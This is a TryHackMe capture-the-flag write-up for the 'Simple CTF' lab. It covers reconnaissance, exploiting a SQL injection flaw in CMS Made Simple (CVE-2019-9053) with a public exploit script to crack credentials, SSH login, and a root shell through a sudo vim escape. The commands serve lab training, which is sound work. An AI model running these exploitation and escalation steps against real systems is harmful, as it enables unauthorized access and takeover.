# Simple CTF — TryHackMe Write-up

## Overview

This room focused on practical penetration testing techniques including:

- Service Enumeration
- Web Enumeration
- Vulnerability Identification
- Exploitation
- SSH Access
- Linux Privilege Escalation

The objective was to gain initial access to the target machine and escalate privileges to root.

---

# Target Information

| Target IP | Difficulty |
|-----------|------------|
| 10.49.x.x | Beginner   |

---

# Initial Reconnaissance

Connected to the TryHackMe VPN using OpenVPN.

```bash
sudo openvpn ap-south-1-VARUNKUMAR05-regular.ovpn
````

Performed an Nmap scan to identify active services.

```bash
sudo nmap -p 1-1000 -sV 10.49.x.x
```

## Nmap Results

| Port | Service | Version             |
| ---- | ------- | ------------------- |
| 21   | FTP     | vsftpd 3.0.3        |
| 80   | HTTP    | Apache httpd 2.4.18 |
| 2222 | SSH     | OpenSSH 7.2p2       |

---

# FTP Enumeration

Connected to the FTP server using anonymous authentication.

```bash
ftp 10.49.x.x
```

Anonymous login was enabled, but no useful files or credentials were discovered.

```text
pub/
```

---

# Web Enumeration

Performed directory brute-forcing using Gobuster.

```bash
gobuster dir -u http://10.49.x.x -w /usr/share/wordlists/dirb/common.txt
```

## Interesting Discovery

```text
/simple
```

The application was identified as:

```text
CMS Made Simple 2.2.8
```

---

# Vulnerability Identification

Used Searchsploit to identify publicly known vulnerabilities associated with the CMS version.

```bash
searchsploit cms made simple 2.2.8
```

## Vulnerability Found

| CVE           | Description   |
| ------------- | ------------- |
| CVE-2019-9053 | SQL Injection |

```text
CMS Made Simple < 2.2.10 - SQL Injection
```

---

# Exploitation

Downloaded and executed a public exploit for CVE-2019-9053.

```bash
python3 46635.py -u http://10.49.x.x/simple -c -w /usr/share/wordlists/rockyou.txt
```

## Parameters Used

| Option | Purpose                           |
| ------ | --------------------------------- |
| `-c`   | Attempts to crack password hashes |
| `-w`   | Specifies the password wordlist   |

---

## Credentials Obtained

| Username | Password |
| -------- | -------- |
| mitch    | secret   |

---

# SSH Access

Connected to the SSH service using the discovered credentials.

```bash
ssh mitch@10.49.x.x -p 2222
```

Successfully obtained user-level shell access.

## User Flag

```text
G00d jøb, keep up!
```

---

# Privilege Escalation

Checked the current user's sudo permissions.

```bash
sudo -l
```

## Misconfiguration Identified

```text
(root) NOPASSWD: /usr/bin/vim
```

The user was allowed to execute Vim as root without authentication.

Referenced GTFOBins for privilege escalation.

```bash
sudo vim -c ':!/bin/bash'
```

Successfully spawned a root shell.

---

# Root Access Achieved

Privilege escalation was successful due to insecure sudo configuration allowing unrestricted Vim execution as root.

---

# Key Takeaways

* Importance of proper enumeration
* Risks of outdated CMS software
* SQL Injection exploitation
* Credential compromise risks
* Linux privilege escalation techniques
* Abuse of insecure sudo configurations

---

# Tools Used

* Nmap
* Gobuster
* Searchsploit
* OpenVPN
* SSH
* GTFOBins

---

# Skills Practiced

* Network Enumeration
* Web Enumeration
* Vulnerability Research
* Exploit Execution
* Credential Attacks
* Linux Privilege Escalation
* Post-Exploitation Enumeration

---

# Screenshots

Store screenshots inside a `/screenshots` folder and reference them here.

---

# Conclusion

This room provided hands-on experience in identifying vulnerable services, exploiting a web application vulnerability, gaining remote access, and performing Linux privilege escalation through insecure sudo configurations.

```
